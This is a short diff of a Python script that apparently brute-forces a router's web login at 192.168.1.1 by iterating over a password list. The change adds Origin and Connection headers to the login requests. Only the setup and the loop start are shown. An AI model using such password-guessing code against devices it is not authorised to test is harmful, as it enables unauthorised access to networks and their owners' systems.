@@ -3,7 +3,7 @@ import colorama
 from colorama import Fore,Style
 def exec(passlist):
     url = "http://192.168.1.1:80/login/login-page.cgi"
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
+    headers = {"Origin": "http://192.168.1.1","Connection": "close","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
     possible_list = []
     for line in passlist:
         pass_ = line.strip("\n")
